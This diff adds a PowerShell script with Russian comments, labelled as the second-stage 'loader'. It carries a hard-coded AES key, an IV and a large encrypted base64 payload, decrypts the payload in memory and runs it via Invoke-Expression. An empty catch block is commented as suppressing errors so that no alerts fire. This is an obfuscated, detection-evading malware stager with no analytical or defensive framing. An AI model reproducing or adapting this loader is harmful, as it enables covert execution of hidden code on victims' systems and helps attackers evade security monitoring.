@@ -1,0 +1,29 @@
+# --- ЭТАП 2: ЗАГРУЗЧИК (LOADER) ---
+
+# 1. ВСТАВЬ СЮДА ДАННЫЕ, ПОЛУЧЕННЫЕ НА ПРЕДЫДУЩЕМ ШАГЕ.
+# Замени содержимое кавычек на свои значения.
+
+$keyBase64 = "2Trx+5IG8LgzT+BDpK5jVzRZOGch4OsMwl3hUtT2PDM="
+$ivBase64 = "Wy49gOYIMkwl8ePnIYuMIQ=="
+$encryptedPayloadBase64 = "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"
+
+# 2. ДЕШИФРОВАНИЕ И ВЫПОЛНЕНИЕ В ПАМЯТИ.
+# НЕ ТРОГАЙ ЭТОТ БЛОК, ЕСЛИ НЕ ПОНИМАЕШЬ, ЧТО ДЕЛАЕШЬ.
+try {
+    $aes = New-Object System.Security.Cryptography.AesManaged
+    $aes.Key = [Convert]::FromBase64String($keyBase64)
+    $aes.IV = [Convert]::FromBase64String($ivBase64)
+    
+    $encryptedBytes = [Convert]::FromBase64String($encryptedPayloadBase64)
+    $decryptor = $aes.CreateDecryptor()
+    $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
+    $aes.Dispose()
+    
+    $decryptedPayload = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+    
+    # Выполнение расшифрованного кода
+    Invoke-Expression -Command $decryptedPayload
+}
+catch {
+    # Этот блок нужен, чтобы скрипт молча завершился в случае ошибки, не выдавая алертов.
+}
